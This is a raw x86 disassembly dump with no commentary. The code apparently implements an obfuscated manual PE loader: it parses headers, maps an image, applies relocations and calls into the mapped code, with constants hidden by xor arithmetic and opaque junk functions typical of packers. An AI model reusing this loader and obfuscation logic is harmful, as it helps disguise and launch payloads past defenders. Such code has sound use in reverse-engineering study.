  4130ba:	add    eax,esi
  4130bc:	cmp    edx,eax
  4130be:	je     0x4131ed
  4130c4:	jmp    0x4131c9
  4130c9:	mov    edx,DWORD PTR [ebp-0x4]
  4130cc:	mov    eax,DWORD PTR [ebp-0x24]
  4130cf:	mov    edi,DWORD PTR [ebp-0x38]
  4130d2:	sub    eax,edx
  4130d4:	xor    edi,ebx
  4130d6:	xor    edx,edx
  4130d8:	add    edi,esi
  4130da:	div    edi
  4130dc:	mov    DWORD PTR [ebp-0xc],eax
  4130df:	mov    eax,DWORD PTR [ebp-0x18]
  4130e2:	mov    edx,DWORD PTR [ebp-0xc]
  4130e5:	xor    eax,ebx
  4130e7:	add    eax,esi
  4130e9:	cmp    edx,eax
  4130eb:	jbe    0x4130f7
  4130ed:	mov    eax,DWORD PTR [ebp-0x18]
  4130f0:	xor    eax,ebx
  4130f2:	add    eax,esi
  4130f4:	mov    DWORD PTR [ebp-0xc],eax
  4130f7:	mov    eax,DWORD PTR [ebp-0x38]
  4130fa:	mov    edx,DWORD PTR [ebp-0xc]
  4130fd:	xor    eax,ebx
  4130ff:	add    eax,esi
  413101:	imul   eax,edx
  413104:	mov    DWORD PTR [ebp-0xc],eax
  413107:	mov    eax,DWORD PTR [ebp-0x1c]
  41310a:	mov    edx,DWORD PTR [ebp-0xc]
  41310d:	xor    eax,ebx
  41310f:	add    eax,esi
  413111:	cmp    edx,eax
  413113:	je     0x4131b7
  413119:	mov    eax,DWORD PTR [ebp-0xc]
  41311c:	mov    DWORD PTR [ebp-0xc],eax
  41311f:	mov    eax,DWORD PTR [ebp-0x4]
  413122:	add    eax,DWORD PTR [ebp-0x2c]
  413125:	mov    DWORD PTR [ebp-0x44],0xf89c85b5
  41312c:	mov    DWORD PTR [ebp-0x40],ecx
  41312f:	mov    DWORD PTR [ebp-0x3c],0xf89c85b3
  413136:	mov    DWORD PTR [ebp-0x28],eax
  413139:	mov    DWORD PTR [ebp-0x88],0xf89c85b0
  413143:	mov    DWORD PTR [ebp-0x3c],ecx
  413146:	mov    eax,DWORD PTR [ebp-0x44]
  413149:	xor    eax,ebx
  41314b:	add    eax,esi
  41314d:	jmp    0x41317a
  41314f:	mov    eax,DWORD PTR [ebp-0x3c]
  413152:	mov    edx,DWORD PTR [ebp-0x10]
  413155:	xor    eax,ebx
  413157:	add    eax,esi
  413159:	imul   eax,edx
  41315c:	mov    edx,DWORD PTR [ebp-0x28]
  41315f:	mov    BYTE PTR [eax+edx*1],0x0
  413163:	mov    eax,DWORD PTR [ebp-0x88]
  413169:	mov    edx,DWORD PTR [ebp-0x40]
  41316c:	xor    eax,ebx
  41316e:	xor    edx,ebx
  413170:	add    eax,esi
  413172:	add    edx,esi
  413174:	imul   eax,edx
  413177:	add    eax,DWORD PTR [ebp-0x10]
  41317a:	mov    DWORD PTR [ebp-0x10],eax
  41317d:	mov    eax,DWORD PTR [ebp-0x10]
  413180:	mov    edx,DWORD PTR [ebp-0xc]
  413183:	cmp    edx,eax
  413185:	jb     0x41314f
  413187:	mov    eax,DWORD PTR [ebp-0x40]
  41318a:	mov    edx,DWORD PTR [ebp-0xc]
  41318d:	xor    eax,ebx
  41318f:	add    eax,esi
  413191:	imul   eax,edx
  413194:	mov    edx,DWORD PTR [ebp-0x44]
  413197:	xor    edx,ebx
  413199:	add    edx,esi
  41319b:	or     eax,edx
  41319d:	mov    edx,DWORD PTR [ebp-0x14]
  4131a0:	xor    edx,ebx
  4131a2:	add    eax,edx
  4131a4:	mov    edx,DWORD PTR [ebp-0x14]
  4131a7:	xor    edx,ebx
  4131a9:	add    eax,edx
  4131ab:	mov    edx,DWORD PTR [ebp-0x4]
  4131ae:	lea    eax,[eax+edx*1+0x64e5ba]
  4131b5:	jmp    0x4131c6
  4131b7:	mov    eax,DWORD PTR [ebp-0x14]
  4131ba:	mov    edx,DWORD PTR [ebp-0x4]
  4131bd:	xor    eax,ebx
  4131bf:	lea    eax,[eax+edx*1+0x3272dd]
  4131c6:	mov    DWORD PTR [ebp-0x4],eax
  4131c9:	mov    eax,DWORD PTR [ebp-0x14]
  4131cc:	xor    eax,ebx
  4131ce:	mov    edx,0xffcd8d23
  4131d3:	sub    edx,eax
  4131d5:	add    edx,DWORD PTR [ebp-0x24]
  4131d8:	mov    eax,DWORD PTR [ebp-0x14]
  4131db:	mov    edi,DWORD PTR [ebp-0x4]
  4131de:	xor    eax,ebx
  4131e0:	add    eax,esi
  4131e2:	imul   eax,edi
  4131e5:	cmp    eax,edx
  4131e7:	jbe    0x4130c9
  4131ed:	push   DWORD PTR [ebp+0x8]
  4131f0:	mov    eax,DWORD PTR [ebp+0x8]
  4131f3:	push   DWORD PTR [eax+0x1cc]
  4131f9:	lea    eax,[ebp-0xa0]
  4131ff:	push   eax
  413200:	mov    eax,DWORD PTR [ebp+0x8]
  413203:	mov    eax,DWORD PTR [eax+0x1c4]
  413209:	push   DWORD PTR [eax]
  41320b:	mov    eax,DWORD PTR [ebp+0x8]
  41320e:	mov    eax,DWORD PTR [eax+0x1c0]
  413214:	push   DWORD PTR [eax]
  413216:	push   DWORD PTR [ebp-0x30]
  413219:	push   DWORD PTR [ebp-0x20]
  41321c:	call   0x413cf2
  413221:	mov    DWORD PTR [ebp-0x2c],eax
  413224:	mov    eax,DWORD PTR [ebp-0x8]
  413227:	mov    ecx,DWORD PTR [ebp-0x20]
  41322a:	xor    eax,ebx
  41322c:	add    eax,esi
  41322e:	cmp    eax,ecx
  413230:	je     0x413251
  413232:	mov    eax,DWORD PTR [ebp+0x8]
  413235:	mov    ecx,DWORD PTR [ebp-0x48]
  413238:	mov    eax,DWORD PTR [eax+0x1d8]
  41323e:	xor    ecx,ebx
  413240:	add    ecx,esi
  413242:	push   ecx
  413243:	mov    ecx,DWORD PTR [ebp-0x8]
  413246:	xor    ecx,ebx
  413248:	add    ecx,esi
  41324a:	push   ecx
  41324b:	push   DWORD PTR [ebp-0x20]
  41324e:	call   DWORD PTR [eax+0x18]
  413251:	pop    edi
  413252:	pop    esi
  413253:	pop    ebx
  413254:	leave  
  413255:	ret    0x4
  413258:	push   ebp
  413259:	mov    ebp,esp
  41325b:	push   ecx
  41325c:	push   ecx
  41325d:	lea    eax,[ebp-0x8]
  413260:	mov    DWORD PTR [ebp-0x4],eax
  413263:	push   esi
  413264:	mov    esi,DWORD PTR [ebp-0x4]
  413267:	mov    eax,0xf881ba0f
  41326c:	mov    DWORD PTR [esi],eax
  41326e:	mov    esi,DWORD PTR [ebp-0x8]
  413271:	cmp    esi,eax
  413273:	pop    esi
  413274:	jne    0x41327e
  413276:	mov    BYTE PTR [ecx+0xa],0x7a
  41327a:	mov    BYTE PTR [edx+0x8],0x2f
  41327e:	mov    BYTE PTR [edx+0xa],0x7a
  413282:	mov    BYTE PTR [ecx+0x2],0x8
  413286:	leave  
  413287:	ret    
  413288:	push   ebp
  413289:	mov    ebp,esp
  41328b:	push   ecx
  41328c:	push   ecx
  41328d:	lea    eax,[ebp-0x8]
  413290:	mov    DWORD PTR [ebp-0x4],eax
  413293:	mov    edx,DWORD PTR [ebp-0x4]
  413296:	mov    eax,0xf88b0beb
  41329b:	mov    DWORD PTR [edx],eax
  41329d:	mov    edx,DWORD PTR [ebp-0x8]
  4132a0:	cmp    edx,eax
  4132a2:	jne    0x4132b3
  4132a4:	mov    eax,DWORD PTR [ebp+0x8]
  4132a7:	mov    BYTE PTR [ecx+0x9],0xe
  4132ab:	mov    BYTE PTR [eax+0x7],0x47
  4132af:	mov    BYTE PTR [ecx+0x6],0xf
  4132b3:	mov    BYTE PTR [ecx+0x3],0x1e
  4132b7:	leave  
  4132b8:	ret    0x4
  4132bb:	push   ebp
  4132bc:	mov    ebp,esp
  4132be:	push   ecx
  4132bf:	push   ecx
  4132c0:	lea    eax,[ebp-0x8]
  4132c3:	mov    DWORD PTR [ebp-0x4],eax
  4132c6:	mov    edx,DWORD PTR [ebp-0x4]
  4132c9:	mov    eax,0x7e0da0f
  4132ce:	mov    DWORD PTR [edx],eax
  4132d0:	mov    edx,DWORD PTR [ebp-0x8]
  4132d3:	cmp    edx,eax
  4132d5:	jne    0x4132db
  4132d7:	mov    BYTE PTR [ecx+0x7],0x47
  4132db:	mov    eax,DWORD PTR [ebp+0x8]
  4132de:	mov    BYTE PTR [ecx+0x1],0x5
  4132e2:	mov    BYTE PTR [eax+0x9],0x2e
  4132e6:	leave  
  4132e7:	ret    0x4
  4132ea:	push   ebp
  4132eb:	mov    ebp,esp
  4132ed:	push   ecx
  4132ee:	push   ecx
  4132ef:	lea    eax,[ebp-0x8]
  4132f2:	mov    DWORD PTR [ebp-0x4],eax
  4132f5:	push   esi
  4132f6:	mov    esi,DWORD PTR [ebp-0x4]
  4132f9:	mov    eax,0x7060e3c
  4132fe:	mov    DWORD PTR [esi],eax
  413300:	mov    esi,DWORD PTR [ebp-0x8]
  413303:	cmp    esi,eax
  413305:	pop    esi
  413306:	jne    0x413312
  413308:	mov    BYTE PTR [edx+0x4],0xb
  41330c:	mov    WORD PTR [ecx+0x3],0xb1e
  413312:	mov    BYTE PTR [edx],0x3f
  413315:	leave  
  413316:	ret    
  413317:	push   ebp
  413318:	mov    ebp,esp
  41331a:	push   ecx
  41331b:	push   ecx
  41331c:	lea    eax,[ebp-0x8]
  41331f:	mov    DWORD PTR [ebp-0x4],eax
  413322:	mov    edx,DWORD PTR [ebp-0x4]
  413325:	mov    eax,0xf8870b3f
  41332a:	mov    DWORD PTR [edx],eax
  41332c:	mov    edx,DWORD PTR [ebp-0x8]
  41332f:	cmp    edx,eax
  413331:	jne    0x41333e
  413333:	mov    eax,DWORD PTR [ebp+0x8]
  413336:	mov    BYTE PTR [ecx+0x8],0xf
  41333a:	mov    BYTE PTR [eax+0x1],0x5
  41333e:	mov    BYTE PTR [ecx+0x5],0xf3
  413342:	leave  
  413343:	ret    0x4
  413346:	push   esi
  413347:	mov    ecx,edi
  413349:	call   0x413317
  41334e:	mov    edx,edi
  413350:	mov    ecx,esi
  413352:	mov    BYTE PTR [esi],0x1f
  413355:	call   0x4132ea
  41335a:	push   esi
  41335b:	mov    ecx,edi
  41335d:	mov    BYTE PTR [esi+0x5],0xf3
  413361:	call   0x4132bb
  413366:	push   esi
  413367:	mov    BYTE PTR [esi+0x6],0xf
  41336b:	call   0x413288
  413370:	mov    BYTE PTR [esi+0x2],0x8
  413374:	mov    edx,esi
  413376:	jmp    0x413258
  41337b:	push   ebp
  41337c:	mov    ebp,esp
  41337e:	push   ecx
  41337f:	mov    ecx,DWORD PTR [edx+0x194]
  413385:	push   esi
  413386:	mov    esi,DWORD PTR [ebp+0x8]
  413389:	mov    esi,DWORD PTR [esi]
  41338b:	mov    DWORD PTR [ecx],esi
  41338d:	mov    ecx,DWORD PTR [edx+0x194]
  413393:	mov    ecx,DWORD PTR [ecx]
  413395:	mov    esi,DWORD PTR [edx+0x190]
  41339b:	mov    DWORD PTR [esi],ecx
  41339d:	mov    eax,DWORD PTR [edx+0x194]
  4133a3:	mov    ecx,DWORD PTR [eax]
  4133a5:	mov    ecx,DWORD PTR [ecx+0x3c]
  4133a8:	add    ecx,DWORD PTR [eax]
  4133aa:	mov    DWORD PTR [ebp-0x4],0xf89ca5b5
  4133b1:	mov    eax,DWORD PTR [ebp-0x4]
  4133b4:	movzx  ecx,WORD PTR [ecx+0x16]
  4133b8:	xor    eax,0x7510896
  4133bd:	add    eax,0x3272dd
  4133c2:	pop    esi
  4133c3:	test   ecx,eax
  4133c5:	je     0x4133d3
  4133c7:	mov    eax,DWORD PTR [edx+0x1c8]
  4133cd:	mov    DWORD PTR [eax],0xf89c85b2
  4133d3:	leave  
  4133d4:	ret    0x4
  4133d7:	push   ebp
  4133d8:	mov    ebp,esp
  4133da:	sub    esp,0x70
  4133dd:	and    DWORD PTR [ebp-0x20],0x0
  4133e1:	mov    DWORD PTR [ebp-0x18],0xf89cb5b5
  4133e8:	mov    DWORD PTR [ebp-0x1c],0xf89c85f5
  4133ef:	mov    DWORD PTR [ebp-0x2c],0xf89c85b1
  4133f6:	mov    DWORD PTR [ebp-0x14],0xf89c85b3
  4133fd:	mov    DWORD PTR [ebp-0x2c],0xf89f05b5
  413404:	mov    eax,DWORD PTR [ebp+0x20]
  413407:	mov    eax,DWORD PTR [eax+0x194]
  41340d:	mov    DWORD PTR [ebp-0xc],eax
  413410:	mov    eax,DWORD PTR [ebp+0x20]
  413413:	push   ebx
  413414:	push   esi
  413415:	mov    esi,DWORD PTR [eax+0x190]
  41341b:	mov    eax,DWORD PTR [ebp+0x20]
  41341e:	mov    eax,DWORD PTR [eax+0x18c]
  413424:	mov    DWORD PTR [ebp-0x8],eax
  413427:	mov    eax,DWORD PTR [eax]
  413429:	push   edi
  41342a:	mov    DWORD PTR [ebp-0x4],esi
  41342d:	test   eax,eax
  41342f:	jne    0x41343c
  413431:	push   DWORD PTR [ebp+0x1c]
  413434:	mov    edx,DWORD PTR [ebp+0x20]
  413437:	call   0x41337b
  41343c:	mov    eax,DWORD PTR [esi]
  41343e:	mov    ebx,DWORD PTR [esi]
  413440:	add    ebx,DWORD PTR [eax+0x3c]
  413443:	mov    eax,DWORD PTR [ebp+0xc]
  413446:	mov    ecx,DWORD PTR [ebp-0x8]
  413449:	mov    ecx,DWORD PTR [ecx]
  41344b:	mov    esi,0x7510896
  413450:	xor    eax,esi
  413452:	mov    edi,0x3272dd
  413457:	add    eax,edi
  413459:	cmp    eax,ecx
  41345b:	jne    0x413693
  413461:	mov    eax,DWORD PTR [ebp-0xc]
  413464:	mov    eax,DWORD PTR [eax]
  413466:	mov    DWORD PTR [ebp-0x10],eax
  413469:	mov    eax,DWORD PTR [ebx+0x50]
  41346c:	mov    DWORD PTR [ebp-0x68],eax
  41346f:	mov    eax,DWORD PTR [ebp-0x18]
  413472:	xor    eax,esi
  413474:	add    eax,edi
  413476:	mov    DWORD PTR [ebp-0x64],eax
  413479:	mov    eax,DWORD PTR [ebp-0x14]
  41347c:	and    DWORD PTR [ebp-0x6c],0x0
  413480:	xor    eax,esi
  413482:	add    eax,edi
  413484:	mov    DWORD PTR [ebp-0x60],eax
  413487:	lea    eax,[ebp-0x70]
  41348a:	push   eax
  41348b:	mov    eax,DWORD PTR [ebp+0x8]
  41348e:	xor    eax,esi
  413490:	add    eax,edi
  413492:	push   eax
  413493:	mov    eax,DWORD PTR [ebp+0x20]
  413496:	add    eax,0xaa
  41349b:	push   eax
  41349c:	mov    eax,DWORD PTR [ebp+0x20]
  41349f:	mov    eax,DWORD PTR [eax+0x198]
  4134a5:	mov    DWORD PTR [ebp-0x70],0x4
  4134ac:	push   DWORD PTR [eax]
  4134ae:	mov    eax,DWORD PTR [ebp+0x10]
  4134b1:	call   eax
  4134b3:	mov    ecx,DWORD PTR [ebp-0xc]
  4134b6:	mov    ecx,DWORD PTR [ecx]
  4134b8:	mov    edx,DWORD PTR [ebp-0x8]
  4134bb:	mov    DWORD PTR [ebp-0x6c],eax
  4134be:	mov    DWORD PTR [ebp+0x1c],eax
  4134c1:	mov    DWORD PTR [edx],ecx
  4134c3:	mov    ecx,DWORD PTR [ebp-0x4]
  4134c6:	mov    DWORD PTR [ecx],eax
  4134c8:	mov    eax,DWORD PTR [ebx+0x50]
  4134cb:	mov    DWORD PTR [ebp-0x68],eax
  4134ce:	mov    eax,DWORD PTR [ebp-0x1c]
  4134d1:	xor    eax,esi
  4134d3:	add    eax,edi
  4134d5:	mov    DWORD PTR [ebp-0x64],eax
  4134d8:	lea    eax,[ebp-0x20]
  4134db:	mov    DWORD PTR [ebp-0x60],eax
  4134de:	lea    eax,[ebp-0x70]
  4134e1:	push   eax
  4134e2:	mov    eax,DWORD PTR [ebp+0x8]
  4134e5:	xor    eax,esi
  4134e7:	add    eax,edi
  4134e9:	push   eax
  4134ea:	mov    eax,DWORD PTR [ebp+0x20]
  4134ed:	add    eax,0xee
  4134f2:	push   eax
  4134f3:	mov    eax,DWORD PTR [ebp+0x20]
  4134f6:	mov    eax,DWORD PTR [eax+0x198]
  4134fc:	mov    DWORD PTR [ebp-0x70],0x4
  413503:	push   DWORD PTR [eax]
  413505:	mov    eax,DWORD PTR [ebp+0x10]
  413508:	call   eax
  41350a:	test   eax,eax
  41350c:	je     0x413531
  41350e:	and    DWORD PTR [ebp+0xc],0x0
  413512:	cmp    DWORD PTR [ebx+0x50],0x0
  413516:	jbe    0x413531
  413518:	mov    eax,DWORD PTR [ebp+0x1c]
  41351b:	mov    ecx,DWORD PTR [ebp-0x10]
  41351e:	sub    ecx,eax
  413520:	mov    dl,BYTE PTR [ecx+eax*1]
  413523:	inc    DWORD PTR [ebp+0xc]
  413526:	mov    BYTE PTR [eax],dl
  413528:	mov    edx,DWORD PTR [ebp+0xc]
  41352b:	inc    eax
  41352c:	cmp    edx,DWORD PTR [ebx+0x50]
  41352f:	jb     0x413520
  413531:	mov    edx,DWORD PTR [ebp+0x1c]
  413534:	mov    ecx,DWORD PTR [edx+0x3c]
  413537:	add    ecx,edx
  413539:	mov    eax,DWORD PTR [ecx+0xa0]
  41353f:	mov    ebx,DWORD PTR [ecx+0x28]
  413542:	add    eax,edx
  413544:	sub    edx,DWORD PTR [ebp-0x10]
  413547:	add    ebx,DWORD PTR [ebp+0x1c]
  41354a:	mov    DWORD PTR [ebp+0xc],edx
  41354d:	mov    DWORD PTR [ebp-0x2c],ecx
  413550:	mov    DWORD PTR [ebp-0x14],ebx
  413553:	mov    DWORD PTR [ebp-0x8],0x0
  41355a:	jmp    0x4135d6
  41355c:	add    edx,0xfffffff8
  41355f:	shr    edx,1
  413561:	mov    DWORD PTR [ebp-0x18],edx
  413564:	je     0x4135c2
  413566:	lea    edx,[eax+0x8]
  413569:	mov    DWORD PTR [ebp-0x4],edx
  41356c:	mov    edx,DWORD PTR [ebp-0x18]
  41356f:	mov    DWORD PTR [ebp-0x18],edx
  413572:	mov    edx,DWORD PTR [ebp-0x4]
  413575:	movzx  edx,WORD PTR [edx]
  413578:	mov    DWORD PTR [ebp-0x24],edx
  41357b:	and    edx,0xfff
  413581:	mov    DWORD PTR [ebp-0x28],edx
  413584:	mov    edx,DWORD PTR [ebp-0x24]
  413587:	shr    edx,0xc
  41358a:	add    edx,0xffcd8d23
  413590:	xor    edx,esi
  413592:	cmp    edx,0xf89c85b0
  413598:	jne    0x4135b9
  41359a:	mov    edx,DWORD PTR [ebp-0x28]
  41359d:	add    edx,DWORD PTR [ebp+0x1c]
  4135a0:	mov    ebx,DWORD PTR [eax]
  4135a2:	cmp    DWORD PTR [ebx+edx*1],0x0
  4135a6:	je     0x4135b6
  4135a8:	mov    ecx,DWORD PTR [ebp+0xc]
  4135ab:	add    ecx,DWORD PTR [ebx+edx*1]
  4135ae:	mov    ebx,DWORD PTR [eax]
  4135b0:	mov    DWORD PTR [edx+ebx*1],ecx
  4135b3:	mov    ecx,DWORD PTR [ebp-0x2c]
  4135b6:	mov    ebx,DWORD PTR [ebp-0x14]
  4135b9:	add    DWORD PTR [ebp-0x4],0x2
  4135bd:	dec    DWORD PTR [ebp-0x18]
  4135c0:	jne    0x413572
  4135c2:	mov    edx,DWORD PTR [ebp-0xc]
  4135c5:	add    DWORD PTR [ebp-0x8],edx
  4135c8:	mov    edx,DWORD PTR [ebp-0x8]
  4135cb:	cmp    edx,DWORD PTR [ecx+0xa4]
  4135d1:	jae    0x4135e4
  4135d3:	add    eax,DWORD PTR [ebp-0xc]
  4135d6:	mov    edx,DWORD PTR [eax+0x4]
  4135d9:	mov    DWORD PTR [ebp-0xc],edx
  4135dc:	test   edx,edx
  4135de:	jne    0x41355c
  4135e4:	mov    eax,DWORD PTR [ebp-0x10]
  4135e7:	mov    DWORD PTR [ebp-0x6c],eax
  4135ea:	mov    DWORD PTR [ebp-0x70],0x4
  4135f1:	mov    eax,DWORD PTR [ecx+0x50]
  4135f4:	mov    DWORD PTR [ebp-0x68],eax
  4135f7:	mov    eax,DWORD PTR [ebp-0x1c]
  4135fa:	xor    eax,esi
  4135fc:	add    eax,edi
  4135fe:	mov    DWORD PTR [ebp-0x64],eax
  413601:	lea    eax,[ebp-0x20]
  413604:	mov    DWORD PTR [ebp-0x60],eax
  413607:	lea    eax,[ebp-0x70]
  41360a:	push   eax
  41360b:	mov    eax,DWORD PTR [ebp+0x8]
  41360e:	xor    eax,esi
  413610:	add    eax,edi
  413612:	push   eax
  413613:	mov    eax,DWORD PTR [ebp+0x20]
  413616:	add    eax,0xee
  41361b:	push   eax
  41361c:	mov    eax,DWORD PTR [ebp+0x20]
  41361f:	mov    eax,DWORD PTR [eax+0x198]
  413625:	push   DWORD PTR [eax]
  413627:	mov    eax,DWORD PTR [ebp+0x10]
  41362a:	call   eax
  41362c:	mov    eax,DWORD PTR [ebp+0x20]
  41362f:	mov    eax,DWORD PTR [eax+0x180]
  413635:	add    eax,DWORD PTR [ebp+0xc]
  413638:	mov    ecx,DWORD PTR [ebp+0xc]
  41363b:	push   DWORD PTR [ebp+0x18]
  41363e:	mov    DWORD PTR [eax],ecx
  413640:	push   DWORD PTR [ebp+0x14]
  413643:	push   DWORD PTR [ebp+0x1c]
  413646:	call   ebx
  413648:	mov    eax,DWORD PTR [ebp+0xc]
  41364b:	add    eax,DWORD PTR [ebp+0x20]
  41364e:	lea    ecx,[ebp+0x4]
  413651:	mov    DWORD PTR [ebp+0x20],eax
  413654:	mov    eax,DWORD PTR [ebp+0x20]
  413657:	mov    eax,DWORD PTR [ebp+0x20]
  41365a:	mov    edx,DWORD PTR [eax+0x190]
  413660:	mov    eax,DWORD PTR [ebp+0x20]
  413663:	mov    eax,DWORD PTR [eax+0x18c]
  413669:	mov    esi,DWORD PTR [eax]
  41366b:	cmp    DWORD PTR [ecx],esi
  41366d:	jb     0x41368e
  41366f:	mov    esi,DWORD PTR [edx]
  413671:	mov    edi,DWORD PTR [edx]
  413673:	mov    esi,DWORD PTR [esi+0x3c]
  413676:	lea    esi,[edi+esi*1+0x50]
  41367a:	mov    edi,DWORD PTR [eax]
  41367c:	add    edi,DWORD PTR [esi]
  41367e:	cmp    DWORD PTR [ecx],edi
  413680:	jae    0x41368e
  413682:	mov    esi,DWORD PTR [eax]
  413684:	mov    eax,DWORD PTR [ecx]
  413686:	mov    edx,DWORD PTR [edx]
  413688:	sub    eax,esi
  41368a:	add    edx,eax
  41368c:	mov    DWORD PTR [ecx],edx
  41368e:	mov    eax,DWORD PTR [ebp+0xc]
  413691:	jmp    0x4136d4
  413693:	push   DWORD PTR [ebp+0x20]
  413696:	call   0x412804
  41369b:	mov    eax,DWORD PTR [ebp+0x20]
  41369e:	mov    eax,DWORD PTR [eax+0x1c8]
  4136a4:	mov    eax,DWORD PTR [eax]
  4136a6:	xor    eax,esi
  4136a8:	add    eax,edi
  4136aa:	mov    eax,DWORD PTR [ebp+0x20]
  4136ad:	jne    0x4136c5
  4136af:	mov    ecx,DWORD PTR [ebp+0x20]
  4136b2:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4136b8:	push   DWORD PTR [ecx]
  4136ba:	mov    eax,DWORD PTR [eax+0x1d8]
  4136c0:	call   DWORD PTR [eax+0x28]
  4136c3:	jmp    0x4136d2
  4136c5:	mov    eax,DWORD PTR [eax+0x17c]
  4136cb:	mov    ecx,DWORD PTR [eax]
  4136cd:	lea    eax,[ebp+0x4]
  4136d0:	add    DWORD PTR [eax],ecx
  4136d2:	xor    eax,eax
  4136d4:	pop    edi
  4136d5:	pop    esi
  4136d6:	pop    ebx
  4136d7:	leave  
  4136d8:	ret    0x1c
  4136db:	push   ebp
  4136dc:	mov    ebp,esp
  4136de:	sub    esp,0x1c
  4136e1:	push   esi
  4136e2:	mov    esi,eax
  4136e4:	mov    eax,DWORD PTR [ecx+0x190]
  4136ea:	cmp    DWORD PTR [eax],0x0
  4136ed:	je     0x4137fd
  4136f3:	test   edx,edx
  4136f5:	je     0x4137fd
  4136fb:	test   esi,esi
  4136fd:	je     0x4137fd
  413703:	mov    eax,DWORD PTR [esi+0x88]
  413709:	test   eax,eax
  41370b:	je     0x4137f8
  413711:	cmp    DWORD PTR [esi+0x8c],0x10
  413718:	je     0x4137f8
  41371e:	cmp    DWORD PTR [esi+0x34],edx
  413721:	je     0x4137f8
  413727:	mov    esi,DWORD PTR [ecx+0x18c]
  41372d:	and    DWORD PTR [ebp-0x10],0x0
  413731:	mov    ecx,edx
  413733:	sub    ecx,DWORD PTR [esi]
  413735:	add    eax,edx
  413737:	movzx  edx,WORD PTR [eax+0xc]
  41373b:	mov    DWORD PTR [ebp-0x1c],ecx
  41373e:	movzx  ecx,WORD PTR [eax+0xe]
  413742:	add    ecx,edx
  413744:	je     0x4137f8
  41374a:	lea    ecx,[eax+0x14]
  41374d:	push   ebx
  41374e:	mov    DWORD PTR [ebp-0x18],ecx
  413751:	mov    esi,0x7fffffff
  413756:	push   edi
  413757:	test   DWORD PTR [ecx],esi
  413759:	je     0x4137da
  41375b:	mov    edx,DWORD PTR [ecx]
  41375d:	and    DWORD PTR [ebp-0xc],0x0
  413761:	and    edx,esi
  413763:	add    edx,eax
  413765:	movzx  edi,WORD PTR [edx+0xe]
  413769:	movzx  ebx,WORD PTR [edx+0xc]
  41376d:	add    edi,ebx
  41376f:	je     0x4137da
  413771:	lea    ecx,[edx+0x14]
  413774:	mov    DWORD PTR [ebp-0x14],ecx
  413777:	test   DWORD PTR [ecx],esi
  413779:	je     0x4137bc
  41377b:	mov    ecx,DWORD PTR [ecx]
  41377d:	and    DWORD PTR [ebp-0x8],0x0
  413781:	and    ecx,esi
  413783:	add    ecx,eax
  413785:	movzx  edi,WORD PTR [ecx+0xe]
  413789:	movzx  ebx,WORD PTR [ecx+0xc]
  41378d:	add    edi,ebx
  41378f:	je     0x4137bc
  413791:	lea    edi,[ecx+0x14]
  413794:	mov    DWORD PTR [ebp-0x4],edi
  413797:	mov    edi,DWORD PTR [ebp-0x4]
  41379a:	mov    edi,DWORD PTR [edi]
  41379c:	test   edi,edi
  41379e:	je     0x4137a6
  4137a0:	mov    ebx,DWORD PTR [ebp-0x1c]
  4137a3:	add    DWORD PTR [edi+eax*1],ebx
  4137a6:	movzx  edi,WORD PTR [ecx+0xe]
  4137aa:	movzx  ebx,WORD PTR [ecx+0xc]
  4137ae:	inc    DWORD PTR [ebp-0x8]
  4137b1:	add    DWORD PTR [ebp-0x4],0x8
  4137b5:	add    edi,ebx
  4137b7:	cmp    DWORD PTR [ebp-0x8],edi
  4137ba:	jb     0x413797
  4137bc:	movzx  edi,WORD PTR [edx+0xe]
  4137c0:	movzx  ebx,WORD PTR [edx+0xc]
  4137c4:	mov    ecx,DWORD PTR [ebp-0x14]
  4137c7:	inc    DWORD PTR [ebp-0xc]
  4137ca:	add    ecx,0x8
  4137cd:	add    edi,ebx
  4137cf:	mov    DWORD PTR [ebp-0x14],ecx
  4137d2:	cmp    DWORD PTR [ebp-0xc],edi
  4137d5:	jb     0x413777
  4137d7:	mov    ecx,DWORD PTR [ebp-0x18]
  4137da:	movzx  edx,WORD PTR [eax+0xe]
  4137de:	movzx  edi,WORD PTR [eax+0xc]
  4137e2:	inc    DWORD PTR [ebp-0x10]
  4137e5:	add    ecx,0x8
  4137e8:	add    edx,edi
  4137ea:	mov    DWORD PTR [ebp-0x18],ecx
  4137ed:	cmp    DWORD PTR [ebp-0x10],edx
  4137f0:	jb     0x413757
  4137f6:	pop    edi
  4137f7:	pop    ebx
  4137f8:	xor    eax,eax
  4137fa:	inc    eax
  4137fb:	jmp    0x4137ff
  4137fd:	xor    eax,eax
  4137ff:	pop    esi
  413800:	leave  
  413801:	ret    
  413802:	push   ebp
  413803:	mov    ebp,esp
  413805:	mov    ecx,DWORD PTR [ecx+0x190]
  41380b:	mov    eax,DWORD PTR [ebp+0xc]
  41380e:	sub    esp,0x10
  413811:	push   ebx
  413812:	xor    ebx,ebx
  413814:	push   esi
  413815:	push   edi
  413816:	cmp    DWORD PTR [ecx],ebx
  413818:	je     0x4138a0
  41381e:	cmp    eax,ebx
  413820:	je     0x4138a0
  413822:	cmp    DWORD PTR [eax+0x78],ebx
  413825:	jne    0x41382c
  413827:	xor    eax,eax
  413829:	inc    eax
  41382a:	jmp    0x4138a2
  41382c:	mov    eax,DWORD PTR [eax+0x78]
  41382f:	add    eax,DWORD PTR [ebp+0x8]
  413832:	mov    ecx,DWORD PTR [eax+0x1c]
  413835:	mov    edx,DWORD PTR [eax+0x24]
  413838:	mov    esi,DWORD PTR [eax+0x14]
  41383b:	mov    edi,DWORD PTR [eax+0x18]
  41383e:	add    ecx,DWORD PTR [ebp+0x8]
  413841:	add    edx,DWORD PTR [ebp+0x8]
  413844:	mov    DWORD PTR [ebp-0x4],esi
  413847:	cmp    esi,edi
  413849:	ja     0x41384e
  41384b:	mov    DWORD PTR [ebp-0x4],edi
  41384e:	mov    DWORD PTR [ebp-0x8],ebx
  413851:	cmp    DWORD PTR [ebp-0x4],ebx
  413854:	jbe    0x413827
  413856:	cmp    ebx,DWORD PTR [eax+0x14]
  413859:	jae    0x413861
  41385b:	movzx  esi,WORD PTR [edx+ebx*2]
  41385f:	jmp    0x413863
  413861:	mov    esi,ebx
  413863:	lea    esi,[ecx+esi*4]
  413866:	mov    edi,DWORD PTR [esi]
  413868:	test   edi,edi
  41386a:	je     0x413895
  41386c:	add    edi,DWORD PTR [ebp+0x8]
  41386f:	mov    DWORD PTR [ebp-0x10],edi
  413872:	cmp    edi,eax
  413874:	jbe    0x413886
  413876:	mov    ebx,DWORD PTR [ebp+0xc]
  413879:	mov    ebx,DWORD PTR [ebx+0x7c]
  41387c:	add    ebx,eax
  41387e:	cmp    edi,ebx
  413880:	jae    0x413886
  413882:	mov    esi,DWORD PTR [esi]
  413884:	jmp    0x41388e
